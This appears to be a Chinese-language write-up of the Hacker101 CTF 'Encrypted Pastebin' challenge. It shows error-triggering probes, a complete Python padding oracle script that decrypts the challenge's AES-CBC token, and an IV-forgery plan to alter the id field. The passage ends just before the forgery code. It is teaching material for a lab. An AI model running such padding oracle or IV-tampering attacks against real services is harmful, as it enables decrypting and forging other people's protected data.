## 背景介绍
[Hackerone](https://www.hackerone.com)是一个漏洞赏金平台，想获取该平台的项目资格，需解答[Hacker101
CTF](https://ctf.hacker101.com/ctf)题目。不同的题目有不同数量的flag，每个flag因题目难度不同而对应不同积分（point）。每得26分就会获得一个私密项目邀请。
本文记录了其中名为“[Encrypted
Pastebin](https://ctf.hacker101.com/ctf/launch/4)”的题目的解法。该题要求技能为Web和Crypto，难度为Hard，共有4个flag，每个flag值9分。
本文写作日期为2019年12月15日。读者阅读本文时可能已经时过境迁，Hacker101
CTF可能不再有这道题目，或内容发生变化。但本文尽可能地详细记录了整个解答过程，没有题目并不影响阅读和理解本文。
若读者正在解答这道题目但没有前进的思路，建议读者 **不要** 继续阅读本文，否则将损害解答这道题目的本意。请带着这一提示关闭本文：padding
oracle。
## 题目描述
题目的地址是动态的，每隔一段时间打开都会不同，所以这里无法给出题目地址。也因其动态性，后文中相关代码或截图中题目地址可能会有所不同，读者只要知道虽然地址不同但其实是同一道题目便不会影响阅读了。
打开题目后看到一个Web页面，如下图所示：
提示文本是：
> We've developed the most secure pastebin on the internet. Your data is
> protected with military-grade 128-bit AES encryption. The key for your data
> is never stored in our database, so no hacker can ever gain unauthorized
> access.
从提示文本中我们知道了加密算法是AES，密钥长度是128比特，那么分组便是16字节。此外我们还知道了加密用户数据的密钥没有保存在数据库中。
我们输入`Title`为`1`，内容也为`1`，然后点击`Post`按钮，页面跳转到了：
    http://35.190.155.168/fc2fd7e530/?post=LPTALJ-WW1!q1nfGhY54lVwmLGQexY7uNSfsUowFr2ercuG5JXhsPhd8qCRF8VhNdeZCxxwCcvztwOURu!Nu!oTs3O7PKqDolpVZAxybuxaIPInRPlTm1mos!7oCcyHvPxS5L!gthTFpbJfrE0Btn3v9-gVly!yyMceC-FQlgsta53SGNVNHBVnwE0fWiLw8Yh2kKNk5Uu9KOWSItZ3ZBQ~~
观察这个URL，看到路径没有变，只是多了`post`参数，参数值长得很像base64编码，但又有一点点区别。页面内容如下图所示：
这道题目便是这个样子，一个功能单一的Web页面。一开始我很困惑这玩意有什么用，后来意识到Pastebin和Blog、BBS一样是一种Web应用，其作用是存储和分享一段纯文本数据，一般是源代码。如Ubuntu就提供自己的[Pastebin](https://paste.ubuntu.com/)服务。应用场景之一是一群人使用IRC讨论编程问题，一个人想向大家分享一段代码，那么他可以将这段代码存储在Pastebin中，将链接分享给大家，这样便避免了大段代码刷屏，感兴趣的人打开链接查看代码一般也能获得比较好的阅读体验。
根据以往做过的Hacker101 CTF题目知道每个漏洞对应一个flag。现在我们要做的便是找出这个加密Pastebin服务的漏洞。
## Flag 1
一开始毫无思路，便想着输入异常数据试图引发错误。将`post`参数的值修改为`1`，提交后结果出乎意料，直接得到了一个flag，如下图所示。
在报错中我们看到了服务器是如何解码`post`参数的：
    b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
其实就是base64编码，只不过替换了3个关键字符。为简单起见，后文中就直接把它称做base64编码。在报错信息中我们还看到在按base64解码`post`参数后，调用一个名为`decryptLink`的函数解密它，解密后按UTF-8解码，并以json格式解析：
    post = json.loads(decryptLink(postCt).decode('utf8'))
从这个报错中暂时就看出这些有用的信息。但同时我们知道，通过触发错误可以获得很多信息。
## Flag 2
### 报错1
现在考虑触发别的报错，向服务器提交能成功base64解码但在调用`decryptLink`解密时报错的数据。我们知道了如何解码`post`参数，便也就知道了如何编码`post`参数。提交`post`参数为`MTix`（一个有效的base64编码），这次报错为：
通过这个报错，我们看到了`decryptLink`函数中有一行代码的内容是：
    cipher = AES.new(staticKey, AES.MODE_CBC, iv)
看来加解密`post`参数使用的密钥是静态的（`staticKey`）。还看到加密使用了CBC模式。报错中说IV（初始向量）长度必须是16字节，看来IV是从`post`参数中提取的。
### 报错2
现在考虑触发新的报错，将16个`*`编码，结果为：
    KioqKioqKioqKioqKioqKg~~
提交此参数，成功触发了新的报错，如下图所示。
从这个报错中我们看到了`decryptLink`函数的最后一行代码，内容是：
    return unpad(cipher.decrypt(data))
报错说`string index out of
range`，应该是提交的`post`参数长度为16字节，刚够IV，实际数据为0，所以产生了这个错误。同时注意到有一个`unpad`操作，看函数名其功能应该是去掉填充（pad）。
### 报错3
再尝试触发新的报错，将32个`*`编码，结果为：
    KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKio~
提交此参数，成功触发了新的报错，如下图所示。
这次的报错中出现了耐人寻味的`PaddingException`，结合CBC模式是可以使用padding
oracle攻击解出明文的。虽然在大学密码学课上骆老师讲过这种攻击方式，但具体细节记不清楚了。查了些资料后补齐了细节，写了一个Python脚本来执行该攻击，脚本内容如下。该攻击的资料很多，网上一搜一大把，这里就不给出具体的参考链接了。后文假设读者清楚padding
oracle攻击的细节，若不清楚，请先查阅资料。
    import base64
    import requests
    def decode(data):
        return base64.b64decode(data.replace('~', '=').replace('!', '/').replace('-', '+'))
    def encode(data):
        return base64.b64encode(data).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')
    def bxor(b1, b2): # use xor for bytes
        result = b""
        for b1, b2 in zip(b1, b2):
            result += bytes([b1 ^ b2])
        return result
    def test(url, data):
        r = requests.get(url+'?post={}'.format(data))
        if 'PaddingException' in r.text:
            return False
        else:
            return True
    def generate_iv_list(tail):
        iv = b'\x00' * (16 - len(tail) -1)
        return [iv+bytes([change])+tail for change in range(0x00, 0xff+1)]
    def padding_oracle(real_iv, url, data):
        index = 15
        plains = bytes()
        tail = bytes()
        while index >= 0:
            for iv in generate_iv_list(tail):
                if test(url, encode(iv+data)):
                    plains = bytes([(16-index) ^ iv[index]]) + plains
                    index -= 1
                    tail = bytes([plain ^ (16-index) for plain in plains])
                    break
        return bxor(real_iv, plains)
    if __name__ == '__main__':
        post = 'LPTALJ-WW1!q1nfGhY54lVwmLGQexY7uNSfsUowFr2ercuG5JXhsPhd8qCRF8VhNdeZCxxwCcvztwOURu!Nu!oTs3O7PKqDolpVZAxybuxaIPInRPlTm1mos!7oCcyHvPxS5L!gthTFpbJfrE0Btn3v9-gVly!yyMceC-FQlgsta53SGNVNHBVnwE0fWiLw8Yh2kKNk5Uu9KOWSItZ3ZBQ~~'
        url = 'http://35.190.155.168/fc2fd7e530/'
        i = 1
        plains = bytes()
        data = decode(post)
        length = len(data)
        while True:
            if i*16 < length:
                iv = data[(i-1)*16: i*16]
                plains += padding_oracle(iv, url, data[i*16: (i+1)*16])
            else:
                break
            i += 1
        print(plains)
运行这个脚本，花了大约1个小时才解出明文是：
    {"flag": "^FLAG^597a59999a26c9f1b48d7xxxxxxxxxxxxxxxxxxxxxxxxxxxb153f505d4755bf2$FLAG$", "id": "3", "key": "XjPkmljch5E2sMiNhsNiqg~~"}\n\n\n\n\n\n\n\n\n\n
至此拿到了第二个flag。
## Flag 3
观察解出的明文，发现它是json格式的，共有三个键，第一个是`flag`，应该纯粹为CTF服务，没有实际意义；第二个是`id`，值为`3`；第三个是`key`，值被用base64编码了，解码后发现是16字节长的二进制数据，怎么看怎么像AES密钥，用它直接解密`post`参数却是失败的，看来是其他地方的密钥了。
我们知道CBC除了padding
oracle攻击外还有字节翻转攻击，利用字节翻转攻击可以把`id`由`3`改成其他值，比如`1`。但实际尝试发现这样做是行不通的，因为字节翻转攻击的原理是修改密文分组中一个字节的值，使下一个分组中明文的对应位置的字节按我们的意愿修改，这样做会导致修改过的密文分组解密出的明文变成乱码，而这个乱码往往无法按UTF-8解码，在`decode('utf8')`时会触发`UnicodeDecodeError`错误。
为了避免`UnicodeDecodeError`错误，我们不能修改任何密文，那么就只能修改IV了。通过修改IV，我们可以控制第一个分组的明文。其原理如下图所示，用想要的明文异或原本的（已知）明文，将结果做为新的IV，解密时会再异或一次得到我们想要的明文。
然而`id`出现在第6个明文分组中，无法直接修改。但好在我们可以完全控制IV和密文，所以可以抛弃部分密文。为便于观察，先把明文按16字节分组，结果如下：
    {"flag": "^FLAG^
    597a59999a26c9f1
    b48d7xxxxxxxxxxx
    xxxxxxxxxxxxxxxx
    b153f505d4755bf2
    $FLAG$", "id": "
    3", "key": "XjPk
    mljch5E2sMiNhsNi
    qg~~"}\n\n\n\n\n
    \n\n\n\n\n
然后再设计我们想要的明文：
    {"id":"1", "i":"
    3", "key": "XjPk
    mljch5E2sMiNhsNi
    qg~~"}\n\n\n\n\n
    \n\n\n\n\n
对比可知完全抛弃了前5个分组，只保留了后5ge分组，并且后5个分组中只有第1个分组的内容是改变了的。这样我们计算出合适的IV，便可以得到想要的结果。具体的计算方法见代码：